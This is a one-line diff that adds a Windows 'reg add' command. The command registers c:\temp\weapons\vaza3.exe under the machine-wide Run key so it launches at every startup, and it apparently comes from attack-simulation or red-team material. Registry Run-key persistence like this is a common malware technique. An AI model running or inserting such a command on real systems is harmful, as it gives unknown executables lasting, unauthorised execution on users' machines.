@@ -1,0 +1,1 @@
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v VaZa /t REG_SZ /d c:\temp\weapons\vaza3.exe /f
